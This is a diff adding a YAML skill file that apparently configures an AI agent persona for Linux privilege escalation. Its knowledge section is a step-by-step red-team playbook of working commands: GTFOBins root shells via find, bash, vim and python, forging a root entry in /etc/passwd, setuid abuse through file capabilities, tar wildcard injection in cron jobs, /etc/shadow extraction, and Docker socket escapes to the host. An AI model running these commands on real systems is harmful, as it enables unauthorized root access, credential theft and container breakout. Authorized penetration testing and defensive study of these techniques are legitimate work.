@@ -1,0 +1,79 @@
+schema_version: 1
+version: 3.0.0
+name: privesc-linux
+description: Senior Linux privilege escalation — sudoers NOPASSWD misconfigurations, SUID GTFOBins exploitation, POSIX file capabilities, cron script hijacking, and container escapes.
+triggers:
+  - privesc
+  - privilege escalation
+  - linux privesc
+  - root
+  - sudoers
+  - gtfobins
+  - linpeas
+  - docker escape
+  - capabilities
+  - getcap
+  - suid privesc
+  - yetki yükseltme
+tools:
+  - find
+  - id
+  - sudo
+  - getcap
+  - stat
+  - ss
+knowledge: |
+  Assess Linux local privilege escalation systematically like a senior red-team operator, moving from non-invasive posture checks to deterministic escalation vectors.
+
+  1. NON-INTERACTIVE SUDOERS & GROUP MEMBERSHIP TRIAGE:
+     - Non-Interactive Sudo Privileges:
+       `sudo -l -n 2>/dev/null`
+       Crucial: `-n` prevents password prompts from blocking the session.
+       Examine output for `NOPASSWD:` entries or commands with wildcards. Cross-reference commands with GTFOBins.
+     - High-Risk Group Memberships:
+       • `docker`: Instant root access by mounting the host root filesystem:
+         `docker run -v /:/host -it alpine chroot /host`
+       • `lxd` / `lxc`: Container creation with root mount permissions.
+       • `disk`: Direct raw read/write access to storage devices (`/dev/sda`, `/dev/vda`) allowing `/etc/shadow` extraction.
+
+  2. SUID/SGID BINARY GTFOBINS EXPLOITATION:
+     - Enumerate all SUID binaries across the filesystem:
+       `find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null`
+     - GTFOBins Escalation Primitives on Standard Tools:
+       • `find`: `find . -exec /bin/sh -p \; -quit`
+       • `bash`: `bash -p` (preserves effective UID 0)
+       • `env`: `env /bin/sh -p`
+       • `vim` / `vi`: `vim -c ':!/bin/sh'`
+       • `python`: `python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
+       • `cp`: Overwrite `/etc/passwd` with a forged root user (e.g., generate password hash via `openssl passwd -1 -salt root password`).
+
+  3. POSIX FILE CAPABILITIES (`getcap`):
+     - Scan the filesystem for unprivileged binaries possessing elevated Linux capabilities:
+       `getcap -r / 2>/dev/null`
+     - High-Impact Capability Targets:
+       • `cap_setuid+ep` on scripting languages (python, perl, node):
+         `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`
+       • `cap_dac_read_search+ep`: Permits arbitrary file read across the system (read `/etc/shadow`, private keys).
+       • `cap_dac_override+ep`: Permits arbitrary file write across the system.
+
+  4. SCHEDULED TASKS, CRON & PATH HIJACKING:
+     - Inspect cron schedules and custom automated scripts:
+       `cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2>/dev/null`
+     - Check file permissions of scripts executed by root:
+       `ls -la <cron_target_script>`
+       If writable by current user or group, append command payload.
+     - Wildcard Injection: If root cron runs `tar *` or `rsync *` inside a writable folder:
+       Create parameter files: `touch -- "--checkpoint=1"` and `touch -- "--checkpoint-action=exec=sh payload.sh"`.
+
+  5. CONTAINER BREAKOUT & DOCKER SOCKET HAZARDS:
+     - Check if operating inside a container: `test -f /.dockerenv || grep -q 'docker\|containerd' /proc/1/cgroup`
+     - Mounted Docker Socket:
+       `ls -la /var/run/docker.sock`
+       If writable: `docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host`
+     - Privileged Container Capabilities:
+       `capsh --print` (look for `cap_sys_admin`, allowing device node creation or cgroup release_agent escapes).
+references:
+  - persona:privesc-linux-v3
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/privesc-linux.yaml
